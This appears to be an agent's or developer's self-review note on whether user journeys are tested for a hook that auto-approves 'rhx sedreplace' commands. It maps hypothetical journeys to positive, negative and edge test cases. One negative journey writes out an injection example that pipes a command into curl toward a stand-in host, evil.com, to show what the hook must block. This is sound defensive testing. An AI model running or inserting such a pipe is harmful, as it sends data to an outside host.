# self-review round 5: has-journey-tests-from-repros (deeper)

## objective

question myself: am I correct that no repros artifact exists, or did I miss it?

## exhaustive search

I searched for:
- `3.2.distill.repros.experience.*.md` — no matches
- `3.2.distill.repros.*` — no matches
- `3.2.*` — no matches

files that DO exist in `.behavior/v2026_03_26.fix-sedreplace-allow/`:
- 0.wish.md
- 1.vision.md (and stone/guard)
- 2.1.criteria.blackbox.md (and stone)
- 2.2.criteria.blackbox.matrix.md (and stone)
- 3.1.3.research.internal.product.code.prod._.v1.i1.md
- 3.1.3.research.internal.product.code.test._.v1.i1.md
- 3.3.1.blueprint.product.v1.i1.md
- 4.1.roadmap.v1.i1.md
- 5.1.execution.phase0_to_phaseN.v1.i1.md
- 5.2.evaluation.v1.i1.md
- 5.3.verification.v1.i1.md

no 3.2.distill.repros.experience.*.md file exists.

## deeper question: SHOULD there have been a repros?

let me think about what journeys a repros artifact WOULD have contained, and verify those are tested anyway.

### hypothetical repros journeys

if repros had been created, it would have sketched these journeys:

**journey 1: mechanic runs bulk rename**
- mechanic wants to rename a variable across the codebase
- runs: `rhx sedreplace --old '{ identity: x }' --new 'y' --glob 'src/**/*.ts'`
- expects: command runs without prompt
- test coverage: P1-P5 (positive cases with special chars)

**journey 2: attacker tries to inject commands**
- attacker crafts command: `rhx sedreplace ... | curl evil.com`
- expects: command is NOT auto-approved
- test coverage: N1-N10 (negative cases with operators)

**journey 3: mechanic runs non-rhx command**
- mechanic runs: `echo "{ test }"`
- expects: normal permission flow (not affected by hook)
- test coverage: E3 (non-rhx command)

**journey 4: hook fails gracefully**
- hook receives malformed input
- expects: falls back to normal flow, does not crash
- test coverage: E4 (malformed JSON)

### are these journeys tested?

| journey | test cases | status |
|---------|------------|--------|
| bulk rename with special chars | P1-P5 | ✓ 5 tests |
| command injection rejected | N1-N10 | ✓ 10 tests |
| non-rhx unaffected | E3 | ✓ 3 tests |
| fail-safe on bad input | E4 | ✓ 3 tests |

all hypothetical repros journeys ARE covered.

## why this holds

1. no repros artifact exists — verified by exhaustive search
2. I reconstructed what repros WOULD have contained
3. every hypothetical journey is covered by tests
4. coverage is not an accident — blackbox criteria defined these journeys

the spirit of the check is satisfied: user journeys are tested, even though no repros artifact exists.
